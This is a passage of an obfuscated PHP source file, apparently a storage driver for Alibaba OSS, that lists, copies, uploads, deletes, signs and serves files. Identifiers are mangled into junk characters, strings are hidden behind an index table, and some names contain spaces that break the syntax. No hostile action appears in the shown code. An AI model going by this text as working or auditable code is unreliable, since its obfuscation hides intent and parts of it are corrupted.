$¤“øË±‘[] = $ªèûô; continue; } $İÏíâŸŸ[] = $«ŞöÜîª; } foreach ($‘õ¡”‹ as $á·Ñ¨Ó) { $¤“øË±‘[] = $á·Ñ¨Ó->getPrefix(); $this->cacheMethodInfoSet($á·Ñ¨Ó->getPrefix(), !0); } if ($‹´ıË€ë === $õğ†¦©‹[12]) { break; } } $this->cacheMethodInfoSet($”„ëÀÌ, !0); return array($õğ†¦©‹[95] => $¤“øË±‘, $õğ†¦©‹[96] => $İÏíâŸŸ); } public function listObject($òøÎ±–, $¬»¯üÁö = '') { $»Û°Áº =& $_SERVER[è¶³ÒßÑ]; $òøÎ±– = trim($òøÎ±–, $»Û°Áº[8]); $Ø¡õë¤Ï = empty($òøÎ±–) && $òøÎ±– !== $»Û°Áº[238] ? $»Û°Áº[12] : $òøÎ±– . $»Û°Áº[8]; $Ò¹ÚíÜç = $»Û°Áº[12]; $óÎÃÚ¶¡ = 1000; $ëâ¾Ş¯ = $îäòÄÈó = array(); while (!0) { check_abort(); $Î”ÈÉöÔ = array($»Û°Áº[1449] => $¬»¯üÁö, $»Û°Áº[1450] => $Ø¡õë¤Ï, $»Û°Áº[1451] => $óÎÃÚ¶¡, $»Û°Áº[1452] => $Ò¹ÚíÜç); try { $±¶ÖéçŒ = $this->client->listObjects($this->bucket, $Î”ÈÉöÔ); } catch (OSS\Core\OssException $‹÷•‡¯³) { $this->writeLog(__FUNCTION__ . $»Û°Áº[224] . $‹÷•‡¯³->getMessage()); break; } $Ò¹ÚíÜç = $±¶ÖéçŒ->getNextMarker(); $˜Ô÷ÁÓ£ = $±¶ÖéçŒ->getObjectList(); foreach ($˜Ô÷ÁÓ£ as $¼¦Í“Ú) { if ($¼¦Í“Ú->getKey() == $Ø¡õë¤Ï) { continue; } $ËĞ™±÷ñ = $¼¦Í“Ú->getKey(); $‰¶ë¯ìì = $¼¦Í“Ú->getSize(); $¥İÆÔ = $‰¶ë¯ìì == 0 && substr($ËĞ™±÷ñ, strlen($ËĞ™±÷ñ) - 1, 1) == $»Û°Áº[8] ? !0 : !1; if ($¥İÆÔ) { continue; } (yield $‰¶ë¯ìì . $»Û°Áº[224] . $ËĞ™±÷ñ); } if ($Ò¹ÚíÜç === $»Û°Áº[12]) { break; } } } public function copyFile($ôçßÊŸ, $‘¨œ¾‚Ç) { $ÃæĞ·³ = $this->size($ôçßÊŸ); if ($ÃæĞ·³ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ôçßÊŸ, $this->bucket, $this->pathEncode($‘¨œ¾‚Ç)); } catch (OSS\Core\OssException $èìĞ£Éˆ) { $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][224] . $èìĞ£Éˆ->getMessage()); return !1; } return $this->getPathOuter($‘¨œ¾‚Ç); } $«¸‡”©ı = $this->multiCopyObject($ôçßÊŸ, $‘¨œ¾‚Ç, $ÃæĞ·³); return $«¸‡”©ı ? $this->getPathOuter($‘¨œ¾‚Ç) : !1; } private function multiCopyObject($ÄŒ¥ºÈ·, $œˆÕ°´§, $ìÁà—Òã) { $ıØæñæ =& $_SERVER[è¶³ÒßÑ]; try { $´Š½¶¹ = array(); if ($ˆÔ¸à²£ = $this->hashMd5($ÄŒ¥ºÈ·)) { $´Š½¶¹ = array(OSS\OssClient::OSS_HEADERS => array($ıØæñæ[1456] => $ˆÔ¸à²£)); } $Ç±ÒÕ ß = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($œˆÕ°´§), $´Š½¶¹); $ŒÖà«Ò = 1; $îª·ìË = 0; $†Ê°ö‰– = array(); $œë˜¹¥ü = 1024 * 1024 * 10; $ŠÑêÄçÜ = $this->client->generateMultiuploadParts($ìÁà—Òã, $œë˜¹¥ü); foreach ($ŠÑêÄçÜ as $Ñè÷åÙ™ => $Ä€ Ìöå) { $‚²…ŸŞ = $îª·ìË + (int) $Ä€ Ìöå[$ıØæñæ[1457]]; $±åİ¨ä¤ = (int) $Ä€ Ìöå[$ıØæñæ[406]] + $‚²…ŸŞ - 1; $·õƒÕÍ = array($ıØæñæ[177] => $‚²…ŸŞ, $ıØæñæ[178] => $±åİ¨ä¤); $†Ê°ö‰–[] = $this->client->uploadPartCopy($this->bucket, $ÄŒ¥ºÈ·, $this->bucket, $this->pathEncode($œˆÕ°´§), $ŒÖà«Ò, $Ç±ÒÕ ß, $·õƒÕÍ); $ŒÖà«Ò = $ŒÖà«Ò + 1; } $§ğìÑ¥¢ = array(); foreach ($†Ê°ö‰– as $Ñè÷åÙ™ => $ª’·Õ) { $§ğìÑ¥¢[] = array($ıØæñæ[1458] => $Ñè÷åÙ™ + 1, $ıØæñæ[1459] => $ª’·Õ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($œˆÕ°´§), $Ç±ÒÕ ß, $§ğìÑ¥¢); } catch (OSS\Core\OssException $¨ìŠäŞ¬) { $this->writeLog(__FUNCTION__ . $ıØæñæ[224] . $¨ìŠäŞ¬->getMessage()); return !1; } return !0; } public function moveFile($ª›ÎÙ§‡, $•ƒ´¥Ô™) { if ($this->copyFile($ª›ÎÙ§‡, $•ƒ´¥Ô™)) { $this->remove($ª›ÎÙ§‡); return $this->getPathOuter($•ƒ´¥Ô™); } return !1; } public function delFile($üÁô×æ¾) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($üÁô×æ¾)); } catch (OSS\Core\OssException $¾Öëù­¶) { $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][224] . $¾Öëù­¶->getMessage()); return !1; } return !0; } public function delFolder($Ú˜œ×Öê) { $äÙìı » =& $_SERVER[è¶³ÒßÑ]; if (!$this->exist($Ú˜œ×Öê)) { return !0; } $this->listItemCache = !1; $Ôú½§Ş° = $this->fileList($Ú˜œ×Öê); $this->listItemCache = !0; $Ö×ä§ó„ = trim($Ú˜œ×Öê, $äÙìı »[8]) . $äÙìı »[8]; if (!empty($Ú˜œ×Öê) && $Ú˜œ×Öê !== $äÙìı »[238] && !in_array($Ö×ä§ó„, $Ôú½§Ş°[$äÙìı »[95]])) { $Ôú½§Ş°[$äÙìı »[95]][] = $Ö×ä§ó„; } $û™¶·‘  = $this->delByBatch($Ôú½§Ş°[$äÙìı »[96]]); if (!$û™¶·‘ ) { return !1; } $û™¶·‘  = $this->delByBatch($Ôú½§Ş°[$äÙìı »[95]]); if (!$û™¶·‘ ) { return !1; } return $this->delFile($Ö×ä§ó„); } private function delByBatch($®‚Äò) { foreach (array_chunk($®‚Äò, 1000) as $‹¢„×µŸ) { try { $this->client->deleteObjects($this->bucket, $‹¢„×µŸ); } catch (OSS\Core\OssException $×–¬ˆ¸û) { $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][224] . $×–¬ˆ¸û->getMessage()); return !1; } } return !0; } public function rename($å­î·“º, $ƒÂúÕ®) { return $this->renameObject($å­î·“º, $ƒÂúÕ®); } private function fileInfo($‹ı±Ê¥•, $œÙ›ØÍı = false, $»ÏùºÆ = array()) { $üğıµğß =& $_SERVER[è¶³ÒßÑ]; $¼¹«øŞ = array($üğıµğß[32] => $this->pathThis($‹ı±Ê¥•), $üğıµğß[97] => $this->getPathOuter($‹ı±Ê¥•), $üğıµğß[33] => $üğıµğß[240], $üğıµğß[89] => isset($»ÏùºÆ[$üğıµğß[89]]) ? $»ÏùºÆ[$üğıµğß[89]] : 0, $üğıµğß[179] => $this->ext($‹ı±Ê¥•)); if ($œÙ›ØÍı) { return $¼¹«øŞ; } $¼¹«øŞ[$üğıµğß[241]] = $¼¹«øŞ[$üğıµğß[98]] = 0; $¼¹«øŞ[$üğıµğß[242]] = $¼¹«øŞ[$üğıµğß[243]] = !0; if (empty($»ÏùºÆ)) { $è·£ù¡› = $this->objectMeta($‹ı±Ê¥•); if (!$è·£ù¡›) { return $¼¹«øŞ; } $»ÏùºÆ = array($üğıµğß[98] => strtotime($è·£ù¡›[$üğıµğß[1455]]), $üğıµğß[89] => $è·£ù¡›[$üğıµğß[1454]] + 0, $üğıµğß[1453] => $è·£ù¡›[$üğıµğß[1453]]); } if (isset($»ÏùºÆ[$üğıµğß[1453]]) && $»ÏùºÆ[$üğıµğß[1453]]) { $¼¹«øŞ[$üğıµğß[245]] = trim($»ÏùºÆ[$üğıµğß[1453]], $üğıµğß[131]); } if (isset($»ÏùºÆ[$üğıµğß[89]])) { $¼¹«øŞ[$üğıµğß[89]] = $»ÏùºÆ[$üğıµğß[89]]; } if (isset($»ÏùºÆ[$üğıµğß[98]])) { $¼¹«øŞ[$üğıµğß[98]] = $»ÏùºÆ[$üğıµğß[98]]; } if (isset($»ÏùºÆ[$üğıµğß[216]]) && !trim($¼¹«øŞ[$üğıµğß[98]])) { $¼¹«øŞ[$üğıµğß[98]] = $»ÏùºÆ[$üğıµğß[216]]; } return $¼¹«øŞ; } private function folderInfo($åó“Ëªü, $¤ç˜¦ÛÌ = false, $äö½—šŒ = array()) { $ƒ¥éŞ =& $_SERVER[è¶³ÒßÑ]; $ŠçÎòŒ = array($ƒ¥éŞ[32] => $this->pathThis($åó“Ëªü), $ƒ¥éŞ[97] => $this->getPathOuter($ƒ¥éŞ[8] . $åó“Ëªü), $ƒ¥éŞ[33] => $ƒ¥éŞ[88]); if ($¤ç˜¦ÛÌ) { return $ŠçÎòŒ; } $ŠçÎòŒ[$ƒ¥éŞ[241]] = $ŠçÎòŒ[$ƒ¥éŞ[98]] = 0; $ŠçÎòŒ[$ƒ¥éŞ[242]] = $ŠçÎòŒ[$ƒ¥éŞ[243]] = !0; if (empty($äö½—šŒ)) { $åó“Ëªü = rtrim($åó“Ëªü, $ƒ¥éŞ[8]) . $ƒ¥éŞ[8]; $”º÷‹² = $this->objectMeta($åó“Ëªü); if (!$”º÷‹²) { return $ŠçÎòŒ; } $äö½—šŒ = array($ƒ¥éŞ[241] => $”º÷‹²[$ƒ¥éŞ[568]][$ƒ¥éŞ[1460]], $ƒ¥éŞ[98] => strtotime($”º÷‹²[$ƒ¥éŞ[1455]])); } if (isset($äö½—šŒ[$ƒ¥éŞ[98]])) { $ŠçÎòŒ[$ƒ¥éŞ[98]] = $äö½—šŒ[$ƒ¥éŞ[98]]; } if (isset($äö½—šŒ[$ƒ¥éŞ[241]])) { $ŠçÎòŒ[$ƒ¥éŞ[241]] = $äö½—šŒ[$ƒ¥éŞ[241]]; } return $ŠçÎòŒ; } public function listPath($®×Æ¿–ß, $‰¬¯•´• = false) { $ÅÉ‰Á²ş =& $_SERVER[è¶³ÒßÑ]; $´ÊŸ•Ã¹ = $this->fileList($®×Æ¿–ß, $ÅÉ‰Á²ş[8], !0); foreach ($´ÊŸ•Ã¹[$ÅÉ‰Á²ş[95]] as $ôòÎòœ => $µö½°Ù¸) { $´ÊŸ•Ã¹[$ÅÉ‰Á²ş[95]][$ôòÎòœ] = $this->folderInfo($µö½°Ù¸, $‰¬¯•´•, $µö½°Ù¸); } foreach ($´ÊŸ•Ã¹[$ÅÉ‰Á²ş[96]] as $ôòÎòœ => $µö½°Ù¸) { $´ÊŸ•Ã¹[$ÅÉ‰Á²ş[96]][$ôòÎòœ] = $this->fileInfo($µö½°Ù¸[$ÅÉ‰Á²ş[32]], $‰¬¯•´•, $µö½°Ù¸); } return $´ÊŸ•Ã¹; } protected function infoChildren($ÎªÀ°ºÕ, &$ÃåÂî˜’) { $ş‹°–şñ =& $_SERVER[è¶³ÒßÑ]; $½Ë—ôèÕ = $this->fileList($ÎªÀ°ºÕ, $ş‹°–şñ[12], !0); $ÃåÂî˜’[$ş‹°–şñ[91]] += count($½Ë—ôèÕ[$ş‹°–şñ[95]]); $ÃåÂî˜’[$ş‹°–şñ[90]] += count($½Ë—ôèÕ[$ş‹°–şñ[96]]); foreach ($½Ë—ôèÕ[$ş‹°–şñ[96]] as $ïş»˜õ¿) { if (!$ïş»˜õ¿ || !$ïş»˜õ¿[$ş‹°–şñ[89]]) { continue; } $ÃåÂî˜’[$ş‹°–şñ[89]] += $ïş»˜õ¿[$ş‹°–şñ[89]]; } } public function has($¶Èî–ìÓ, $ºÈÏŒÓş = false, $ƒ›ö²½à = true) { $¤×«­Â =& $_SERVER[è¶³ÒßÑ]; $¶Èî–ìÓ = trim($¶Èî–ìÓ, $¤×«­Â[8]); $ß•±ÑÛ = empty($¶Èî–ìÓ) && $¶Èî–ìÓ !== $¤×«­Â[238] ? $¤×«­Â[12] : $¶Èî–ìÓ . $¤×«­Â[8]; $ßÕöË…¦ = $¤×«­Â[12]; $Ğ™ÉğÛ§ = 500; $¦¾šöî· = $º—êù³” = 0; while (!0) { check_abort(); $²Äéç·ö = array($¤×«­Â[1449] => $¤×«­Â[8], $¤×«­Â[1450] => $ß•±ÑÛ, $¤×«­Â[1451] => $Ğ™ÉğÛ§, $¤×«­Â[1452] => $ßÕöË…¦); try { $®şÔ€Åß = $this->client->listObjects($this->bucket, $²Äéç·ö); } catch (OSS\Core\OssException $¡±«ÖÏ) { $this->writeLog(__FUNCTION__ . $¤×«­Â[224] . $¡±«ÖÏ->getMessage()); break; } $ßÕöË…¦ = $®şÔ€Åß->getNextMarker(); $º¸Äì—˜ = $®şÔ€Åß->getObjectList(); $µ—§®ÎÀ = $®şÔ€Åß->getPrefixList(); if ($ºÈÏŒÓş) { if (count($º¸Äì—˜) > 1 || count($º¸Äì—˜) == 1 && $º¸Äì—˜[0]->getKey() != $ß•±ÑÛ) { $¦¾šöî· += count($º¸Äì—˜) - 1; } if (!empty($µ—§®ÎÀ)) { $º—êù³” += count($µ—§®ÎÀ); } if ($ßÕöË…¦ === $¤×«­Â[12]) { break; } continue; } if ($ƒ›ö²½à) { if (!empty($º¸Äì—˜)) { if (count($º¸Äì—˜) > 1 || $º¸Äì—˜[0]->getKey() != $ß•±ÑÛ) { return !0; } } } else { if (!empty($µ—§®ÎÀ)) { return !0; } } if ($ßÕöË…¦ === $¤×«­Â[12]) { break; } } if ($ºÈÏŒÓş) { return array($¤×«­Â[249] => $¦¾šöî·, $¤×«­Â[250] => $º—êù³”); } return !1; } public function listAll($øğçƒ®Š) { $ëÍÒ±® =& $_SERVER[è¶³ÒßÑ]; $…ÂõŸ†µ = $this->fileList($øğçƒ®Š, $ëÍÒ±®[12], !0); $ù…×Î›Å = array_to_keyvalue($…ÂõŸ†µ[$ëÍÒ±®[96]], $ëÍÒ±®[32]); foreach ($…ÂõŸ†µ[$ëÍÒ±®[95]] as $êÆªõ£ù) { if (is_string($êÆªõ£ù)) { $ù…×Î›Å[$êÆªõ£ù] = array($ëÍÒ±®[89] => 0); } } return $this->listAllFiles($øğçƒ®Š, $ù…×Î›Å); } public function canRead($Ğş·‚ÁÆ) { $€İÊ¾—÷ =& $_SERVER[è¶³ÒßÑ]; $Ë¤¥ğ• = $this->pathAcl($Ğş·‚ÁÆ); return $Ë¤¥ğ• == $€İÊ¾—÷[1461] || $Ë¤¥ğ• == $€İÊ¾—÷[612] ? !0 : !1; } public function canWrite($‡ã—Š×½) { $†Œ¾‹ï = $this->pathAcl($‡ã—Š×½); return $†Œ¾‹ï == $_SERVER[è¶³ÒßÑ][612] ? !0 : !1; } public function pathAcl($ÄÌî±Ó®) { $·‘Ä™ÉÆ =& $_SERVER[è¶³ÒßÑ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $à‹·»Áï = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÄÌî±Ó®)); } catch (OSS\Core\OssException $•Ş‘’«÷) { $this->writeLog(__FUNCTION__ . $·‘Ä™ÉÆ[224] . $•Ş‘’«÷->getMessage()); return !1; } $¾Ò×¯ä³ = $à‹·»Áï == $·‘Ä™ÉÆ[37] ? $this->bucketAcl : $à‹·»Áï; if ($¾Ò×¯ä³ == $·‘Ä™ÉÆ[1462]) { return $·‘Ä™ÉÆ[1461]; } if ($¾Ò×¯ä³ == $·‘Ä™ÉÆ[1463]) { return $·‘Ä™ÉÆ[612]; } return $¾Ò×¯ä³; } private function chmodPath($õ˜»¡¬õ, $…ŞÆæÄ¼ = '') { $£¤Ùš‡ =& $_SERVER[è¶³ÒßÑ]; $ĞÜ•®Ï“ = empty($…ŞÆæÄ¼) ? $£¤Ùš‡[1463] : $…ŞÆæÄ¼; $Õ´À‹Ø­ = array($£¤Ùš‡[37], $£¤Ùš‡[239], $£¤Ùš‡[1462], $£¤Ùš‡[1463]); if (!in_array($ĞÜ•®Ï“, $Õ´À‹Ø­)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($õ˜»¡¬õ), $ĞÜ•®Ï“); } catch (OSS\Core\OssException $›î·Ôà‚) { $this->writeLog(__FUNCTION__ . $£¤Ùš‡[224] . $›î·Ôà‚->getMessage()); return !1; } return !0; } public function getContent($Š¨åÚà) { return $this->fileSubstr($Š¨åÚà, -1); } public function setContent($ãõ½ÒÎİ, $Şï‘ëÉì = '') { $æÃøéèı =& $_SERVER[è¶³ÒßÑ]; try { $Øüß‡ï‘ = $this->trafficLimit($æÃøéèı[1464]); $ĞÚÀß½— = $this->client->putObject($this->bucket, $this->pathEncode($ãõ½ÒÎİ), $Şï‘ëÉì, $Øüß‡ï‘); } catch (OSS\Core\OssException $úäçÂÕ) { $this->writeLog(__FUNCTION__ . $æÃøéèı[224] . $úäçÂÕ->getMessage()); return !1; } $ß²‰ç»± = array($æÃøéèı[1456] => trim($ĞÚÀß½—[$æÃøéèı[1453]], $æÃøéèı[131]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ãõ½ÒÎİ))); $this->updateObjMeta($ãõ½ÒÎİ, $ß²‰ç»±); return isset($ĞÚÀß½—[$æÃøéèı[1465]][$æÃøéèı[301]]) ? !0 : !1; } private function updateObjMeta($ Ú³ò¦Ë, $¹À²Ò¼Ë) { $ Ú³ò¦Ë = $this->pathEncode($ Ú³ò¦Ë); try { $û´¸Ú§¤ = array(OSS\OssClient::OSS_HEADERS => $¹À²Ò¼Ë); $this->client->copyObject($this->bucket, $ Ú³ò¦Ë, $this->bucket, $ Ú³ò¦Ë, $û´¸Ú§¤); } catch (OSS\Core\OssException $Óãâ¤Ë‡) { $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][224] . $Óãâ¤Ë‡->getMessage()); return !1; } return !0; } public function upload($·­Ü€¹, $ÊİêÓ¹¢, $Õ¾§¼‰Ş = false, $æ¯©ç•Ú = REPEAT_REPLACE) { $ûÚ²°°¢ =& $_SERVER[è¶³ÒßÑ]; $™ËÕ‹â = trim($·­Ü€¹, $ûÚ²°°¢[8]); $ëÛÓ¦¢ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ûÚ²°°¢[1456] => @md5_file($ÊİêÓ¹¢)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($·­Ü€¹))); $ëÛÓ¦¢ = $this->trafficLimit($ûÚ²°°¢[1464], $ëÛÓ¦¢); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($™ËÕ‹â), $ÊİêÓ¹¢, $ëÛÓ¦¢); } catch (OSS\Core\OssException $åÃïĞö¥) { $this->writeLog(__FUNCTION__ . $ûÚ²°°¢[224] . $åÃïĞö¥->getMessage()); return !1; } return $this->getPathOuter($·­Ü€¹); } public function getHost() { $ÚµØÌœ =& $_SERVER[è¶³ÒßÑ]; $ïíÇØüÎ = explode($ÚµØÌœ[220], parent::getHost()); return $ïíÇØüÎ[0] . $ÚµØÌœ[220] . $this->bucket . $ÚµØÌœ[10] . $ïíÇØüÎ[1]; } public function uploadFormData($½Ë‰ùï», $„Å´‡Í = 3600) { $Æ”ş£‡ =& $_SERVER[è¶³ÒßÑ]; if (!($ªöÖ‹Ó = $this->getHost())) { return !1; } $ÚïÅ© = $„Å´‡Í; $•ŞÖÙÎå = date($Æ”ş£‡[1466], time() + $ÚïÅ©); $ĞÔÔ†éà = new DateTime($•ŞÖÙÎå); $ñĞ•ğ— = $ĞÔÔ†éà->format(DateTime::ISO8601); $Ü¿äíêå = strpos($ñĞ•ğ—, $Æ”ş£‡[365]); $ñĞ•ğ— = substr($ñĞ•ğ—, 0, $Ü¿äíêå) . $Æ”ş£‡[1467]; $ÌÙë’” = 1048576000 * 5; $«¨Æª˜ş = $this->pathFather($½Ë‰ùï»); $ŒÌëªşû = array($Æ”ş£‡[284] => $ñĞ•ğ—, $Æ”ş£‡[287] => array(array($Æ”ş£‡[1468], 0, $ÌÙë’”), array($Æ”ş£‡[290], $Æ”ş£‡[291], $«¨Æª˜ş))); $ë‹Íâ—Ô = base64_encode(json_encode($ŒÌëªşû)); $Õ¼‹Ÿ›Ó = base64_encode(hash_hmac($Æ”ş£‡[272], $ë‹Íâ—Ô, $this->secret, !0)); $¾†¦‹èÖ = array($Æ”ş£‡[302] => $ë‹Íâ—Ô, $Æ”ş£‡[1469] => $this->accessKey, $Æ”ş£‡[294] => $Æ”ş£‡[283], $Æ”ş£‡[1470] => $Õ¼‹Ÿ›Ó, $Æ”ş£‡[218] => $ªöÖ‹Ó); $¾†¦‹èÖ = $this->trafficLimit($Æ”ş£‡[1464], $¾†¦‹èÖ); return $¾†¦‹èÖ; } public function multiUploadFormData($òÒô Ô, $ ñõ•›ê = 3600) { $‚ï¢äÅÃ =& $_SERVER[è¶³ÒßÑ]; if (!($‡×æÖÄ = $this->getHost())) { return !1; } $ÀÃ¸ÚÇæ = $this->trafficLimit($‚ï¢äÅÃ[1464]); $ÃÓˆë‹ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($òÒô Ô), $ÀÃ¸ÚÇæ); return array($‚ï¢äÅÃ[264] => $ÃÓˆë‹, $‚ï¢äÅÃ[218] => $‡×æÖÄ . $‚ï¢äÅÃ[8] . $this->pathEncode($òÒô Ô), $‚ï¢äÅÃ[265] => gmdate($‚ï¢äÅÃ[1471]), $‚ï¢äÅÃ[107] => $òÒô Ô); } public function multiUploadAuthData($¯ÄŠµÇ¾, $‹¸‚şµ  = array()) { $ùöÑÜ¢Ğ =& $_SERVER[è¶³ÒßÑ]; $¼é¯Şš = isset($‹¸‚şµ [$ùöÑÜ¢Ğ[265]]) ? $‹¸‚şµ [$ùöÑÜ¢Ğ[265]] : gmdate($ùöÑÜ¢Ğ[1471]); $•œ„“Œ» = isset($‹¸‚şµ [$ùöÑÜ¢Ğ[179]]) ? $‹¸‚şµ [$ùöÑÜ¢Ğ[179]] : $ùöÑÜ¢Ğ[12]; $û…ŠÒòØ = $¯ÄŠµÇ¾; if (isset($‹¸‚şµ [$ùöÑÜ¢Ğ[107]])) { $û…ŠÒòØ = $‹¸‚şµ [$ùöÑÜ¢Ğ[107]]; unset($‹¸‚şµ [$ùöÑÜ¢Ğ[107]]); } if (isset($‹¸‚şµ [$ùöÑÜ¢Ğ[266]])) { $‹¸‚şµ [$ùöÑÜ¢Ğ[265]] = $¼é¯Şš; return $this->listUploadParts($û…ŠÒòØ, $‹¸‚şµ ); } $Æ‘®ó“ğ = array($ùöÑÜ¢Ğ[267], $ùöÑÜ¢Ğ[12], $ùöÑÜ¢Ğ[133], $¼é¯Şš, "\170\55\x6f\163\x73\x2d\144\141\x74\145\72{$¼é¯Şš}", $ùöÑÜ¢Ğ[8] . $this->bucket . $ùöÑÜ¢Ğ[8] . $û…ŠÒòØ . $•œ„“Œ»); if (strpos($•œ„“Œ», $ùöÑÜ¢Ğ[268]) === 0) { $Æ‘®ó“ğ[0] = $ùöÑÜ¢Ğ[269]; if ($ÎÄÏ’¼€ = $this->trafficLimit($ùöÑÜ¢Ğ[1464])) { $û…ŠÒòØ = $ùöÑÜ¢Ğ[1472]; array_splice($Æ‘®ó“ğ, 5, 0, $û…ŠÒòØ . $ùöÑÜ¢Ğ[4] . $ÎÄÏ’¼€[$û…ŠÒòØ]); } } if (isset($‹¸‚şµ [$ùöÑÜ¢Ğ[270]]) && $‹¸‚şµ [$ùöÑÜ¢Ğ[270]] == $ùöÑÜ¢Ğ[271]) { $Æ‘®ó“ğ[0] = $ùöÑÜ¢Ğ[271]; } if (!empty($‹¸‚şµ [$ùöÑÜ¢Ğ[1473]])) { $½ôï¨¢¹ = array_merge(array($Æ‘®ó“ğ[4]), $‹¸‚şµ [$ùöÑÜ¢Ğ[1473]]); sort($½ôï¨¢¹); $Æ‘®ó“ğ[4] = implode($ùöÑÜ¢Ğ[60], $½ôï¨¢¹); } $­òä Û† = implode($ùöÑÜ¢Ğ[60], $Æ‘®ó“ğ); $ÌòàÇö¬ = base64_encode(hash_hmac($ùöÑÜ¢Ğ[272], $­òä Û†, $this->secret, !0)); $ÎÁ˜«† = $ùöÑÜ¢Ğ[1439] . $this->accessKey . $ùöÑÜ¢Ğ[4] . $ÌòàÇö¬; if (strpos($•œ„“Œ», $ùöÑÜ¢Ğ[268]) === 0) { $ÎÁ˜«† = array($ùöÑÜ¢Ğ[274] => $ÎÁ˜«†, $ùöÑÜ¢Ğ[265] => $¼é¯Şš); if ($ÎÄÏ’¼€) { $ÎÁ˜«† = array_merge($ÎÁ˜«†, $ÎÄÏ’¼€); } } return $ÎÁ˜«†; } public function listUploadParts($’÷‰ Ï­, $€­ª°ş) { $Š¾Óë´ä =& $_SERVER[è¶³ÒßÑ]; $¬Ò¾ìÂä = parse_url_query($€­ª°ş[$Š¾Óë´ä[179]]); $¬Á„ˆÏ€ = $this->client->listParts($this->bucket, $this->pathEncode($’÷‰ Ï­), $¬Ò¾ìÂä[$Š¾Óë´ä[264]]); $µÓŠµ½š = $¬Á„ˆÏ€->getListPart(); $‘ƒ“±µ = array(); foreach ($µÓŠµ½š as $• Ÿ£ï) { $‘ƒ“±µ[] = array($Š¾Óë´ä[1458] => $• Ÿ£ï->getPartNumber(), $Š¾Óë´ä[1459] => trim($• Ÿ£ï->getETag(), $Š¾Óë´ä[131])); } unset($€­ª°ş[$Š¾Óë´ä[266]], $€­ª°ş[$Š¾Óë´ä[270]]); $â§Òº’— = $this->multiUploadAuthData($’÷‰ Ï­, $€­ª°ş); if (empty($â§Òº’—)) { return !1; } return array($Š¾Óë´ä[274] => $â§Òº’—, $Š¾Óë´ä[265] => $€­ª°ş[$Š¾Óë´ä[265]], $Š¾Óë´ä[276] => $‘ƒ“±µ); } public function download($Ğúç™ÊÉ, $×±Îæ‚˜) { $•üë«ØÀ =& $_SERVER[è¶³ÒßÑ]; if ($this->isFolder($Ğúç™ÊÉ)) { return !1; } try { $±à¥À¶× = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $×±Îæ‚˜); $±à¥À¶× = $this->trafficLimit($•üë«ØÀ[122], $±à¥À¶×); $this->client->getObject($this->bucket, $this->pathEncode($Ğúç™ÊÉ), $±à¥À¶×); } catch (OSS\Core\OssException $Ã¶Ûƒô) { $this->writeLog(__FUNCTION__ . $•üë«ØÀ[224] . $Ã¶Ûƒô->getMessage()); return !1; } return $×±Îæ‚˜; } public function fileSubstr($œ¢õ×å£, $¼ÙÅ¬’À = 0, $ ÚñÄ· = false) { if ($¼ÙÅ¬’À === -1) { $´½¯Î“ï = array(); } else { if ($ ÚñÄ· === !1) { $³æçÛœ‚ = $this->size($œ¢õ×å£); } else { $³æçÛœ‚ = $¼ÙÅ¬’À + $ ÚñÄ· - 1; } $´½¯Î“ï = array(OSS\OssClient::OSS_RANGE => "{$¼ÙÅ¬’À}\55{$³æçÛœ‚}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($œ¢õ×å£), $´½¯Î“ï); } catch (OSS\Core\OssException $–ò•³è) { $this->writeLog(__FUNCTION__ . $_SERVER[è¶³ÒßÑ][224] . $–ò•³è->getMessage()); think_exception($–ò•³è->getMessage()); return !1; } } private function trafficLimit($‹øÛÂåÏ, $â‘½«èÓ = array()) { $óÍí·¢„ =& $_SERVER[è¶³ÒßÑ]; if ($‹øÛÂåÏ == $óÍí·¢„[1464] && $this->isUploadServer() || $‹øÛÂåÏ == $óÍí·¢„[122] && $this->isFileOutServer()) { return $â‘½«èÓ; } $çÅƒÖã = floatval($GLOBALS[$óÍí·¢„[6]][$óÍí·¢„[102]][$óÍí·¢„[120]][$‹øÛÂåÏ]) * 1024 * 1024 * 8; if (!$çÅƒÖã) { return $â‘½«èÓ; } $çÅƒÖã = $çÅƒÖã < 819200 ? 819200 : ($çÅƒÖã > 838860800 ? 838860800 : $çÅƒÖã); $â‘½«èÓ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($çÅƒÖã); return $â‘½«èÓ; } public function link($Íšê‡å„, $İú¶„ÏË = array()) { $ß£Ñı÷ =& $_SERVER[è¶³ÒßÑ]; if (!$this->exist($Íšê‡å„) || $this->isFolder($Íšê‡å„)) { return !1; } try { $İú¶„ÏË = $this->trafficLimit($ß£Ñı÷[122], $İú¶„ÏË); $æÊÙé‹Ø = $this->client->signUrl($this->bucket, $this->pathEncode($Íšê‡å„), 3600 * 12, $ß£Ñı÷[271], $İú¶„ÏË); return $this->getCdnLink($æÊÙé‹Ø); } catch (OSS\Core\OssException $á¥Œ©») { $this->writeLog(__FUNCTION__ . $ß£Ñı÷[224] . $á¥Œ©»->getMessage()); return !1; } } public function fileOut($¹Ì—Ä¦Ê, $¤Å½¹Ã = false, $«¬Ğ°½Ì = false, $›ŸŒÑê = '') { $²­‰”é =& $_SERVER[è¶³ÒßÑ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¹Ì—Ä¦Ê, $¤Å½¹Ã, $«¬Ğ°½Ì, $›ŸŒÑê); } if (!$«¬Ğ°½Ì) { $«¬Ğ°½Ì = $this->pathThis($¹Ì—Ä¦Ê); } $«¬Ğ°½Ì = rawurlencode($«¬Ğ°½Ì); $²ú‘†°¾ = 